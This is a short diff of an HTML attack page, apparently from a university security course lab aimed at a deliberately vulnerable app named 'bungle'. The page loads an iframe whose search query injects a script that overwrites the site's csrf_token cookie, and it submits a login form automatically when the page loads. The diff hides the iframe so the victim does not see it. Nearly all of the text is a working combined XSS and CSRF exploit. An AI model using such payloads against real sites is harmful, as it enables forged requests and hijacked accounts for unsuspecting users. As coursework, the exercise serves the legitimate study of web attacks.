@@ -5,7 +5,11 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 </head>
 <body onload="document.forms['login'].submit();">
-    <iframe name="Z" id="frame" src="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Edocument.cookie%20=%27csrf_token=aa8420669340a09ef8852635b10aef85%27%3C/script%3E"></iframe>
+    <iframe 
+        name="Z" 
+        style="display: none;" 
+        src="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Edocument.cookie%20=%27csrf_token=aa8420669340a09ef8852635b10aef85%27%3C/script%3E"
+    ></iframe>
     <form 
         name="login" 
         action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" 
